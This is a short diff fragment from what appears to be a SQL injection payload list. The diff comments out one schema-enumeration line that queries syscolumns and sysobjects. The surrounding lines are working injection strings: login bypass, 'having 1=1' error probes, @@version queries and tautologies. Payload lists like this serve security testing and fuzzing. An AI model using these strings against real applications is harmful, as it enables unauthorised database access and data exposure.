@@ -23,7 +23,7 @@ Admin' OR '
 ' having 1=1--
 ' having 1=1--
 ' group by userid having 1=1--
-' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+#' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
 ' or 1 in (select @@version)--
 ' union all select @@version--
 ' OR 'unusual' = 'unusual'
